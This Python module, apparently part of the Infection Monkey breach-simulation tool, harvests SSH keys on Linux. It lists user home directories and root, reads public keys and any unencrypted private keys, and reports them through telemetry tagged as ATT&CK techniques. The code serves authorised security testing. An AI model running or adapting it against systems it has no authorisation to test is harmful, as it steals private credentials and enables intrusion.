import glob
import logging
import os
from typing import Dict, Iterable

from common.utils.attack_utils import ScanStatus
from infection_monkey.telemetry.attack.t1005_telem import T1005Telem
from infection_monkey.telemetry.attack.t1145_telem import T1145Telem
from infection_monkey.telemetry.messengers.i_telemetry_messenger import ITelemetryMessenger
from infection_monkey.utils.environment import is_windows_os

logger = logging.getLogger(__name__)

DEFAULT_DIRS = ["/.ssh/", "/"]


def get_ssh_info(telemetry_messenger: ITelemetryMessenger) -> Iterable[Dict]:
    # TODO: Remove this check when this is turned into a plugin.
    if is_windows_os():
        logger.debug(
            "Skipping SSH credentials collection because the operating system is not Linux"
        )
        return []

    home_dirs = _get_home_dirs()
    ssh_info = _get_ssh_files(home_dirs, telemetry_messenger)

    return ssh_info


def _get_home_dirs() -> Iterable[Dict]:
    import pwd
    root_dir = _get_ssh_struct("root", "")
    home_dirs = [
        _get_ssh_struct(x.pw_name, x.pw_dir) for x in pwd.getpwall() if x.pw_dir.startswith("/home")
    ]
    home_dirs.append(root_dir)
    return home_dirs


def _get_ssh_struct(name: str, home_dir: str) -> Dict:
    """
    Construct the SSH info. It consisted of: name, home_dir,
    public_key and private_key.

    public_key: contents of *.pub file (public key)
    private_key: contents of * file (private key)

    :param name: username of user, for whom the keys belong
    :param home_dir: users home directory
    :return: SSH info struct
    """
    # TODO: There may be multiple public keys for a single user
    # TODO: Authorized keys are missing.
    return {
        "name": name,
        "home_dir": home_dir,
        "public_key": None,
        "private_key": None,
    }


def _get_ssh_files(
    usr_info: Iterable[Dict], telemetry_messenger: ITelemetryMessenger
) -> Iterable[Dict]:
    for info in usr_info:
        path = info["home_dir"]
        for directory in DEFAULT_DIRS:
            # TODO: Use PATH
            if os.path.isdir(path + directory):
                try:
                    current_path = path + directory
                    # Searching for public key
                    if glob.glob(os.path.join(current_path, "*.pub")):
                        # TODO: There may be multiple public keys for a single user
                        # Getting first file in current path with .pub extension(public key)
                        public = glob.glob(os.path.join(current_path, "*.pub"))[0]
                        logger.info("Found public key in %s" % public)
                        try:
                            with open(public) as f:
                                info["public_key"] = f.read()
                            # By default, private key has the same name as public,
                            # only without .pub
                            private = os.path.splitext(public)[0]
                            if os.path.exists(private):
                                try:
                                    with open(private) as f:
                                        # no use from ssh key if it's encrypted
                                        private_key = f.read()
                                        if private_key.find("ENCRYPTED") == -1:
                                            info["private_key"] = private_key
                                            logger.info("Found private key in %s" % private)
                                            telemetry_messenger.send_telemetry(
                                                T1005Telem(
                                                    ScanStatus.USED, "SSH key", "Path: %s" % private
                                                )
                                            )
                                            telemetry_messenger.send_telemetry(
                                                T1145Telem(
                                                    ScanStatus.USED, info["name"], info["home_dir"]
                                                )
                                            )
                                        else:
                                            continue
                                except (IOError, OSError):
                                    pass
                            # If private key found don't search more
                            if info["private_key"]:
                                break
                        except (IOError, OSError):
                            pass
                except OSError:
                    pass
    usr_info = [info for info in usr_info if info["private_key"] or info["public_key"]]
    return usr_info
